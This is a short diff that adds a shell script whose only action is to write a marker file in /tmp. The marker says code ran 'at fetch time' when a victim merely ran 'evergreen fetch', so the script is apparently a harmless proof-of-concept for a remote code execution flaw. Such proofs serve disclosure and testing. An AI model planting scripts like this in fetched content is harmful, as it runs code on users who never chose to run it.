@@ -1,0 +1,2 @@
+#!/bin/sh
+echo "FETCH-TIME RCE (victim ran only 'evergreen fetch', no shell): ran as $(id -un) at $(date)" > /tmp/EVG_FETCHTIME_RCE.txt
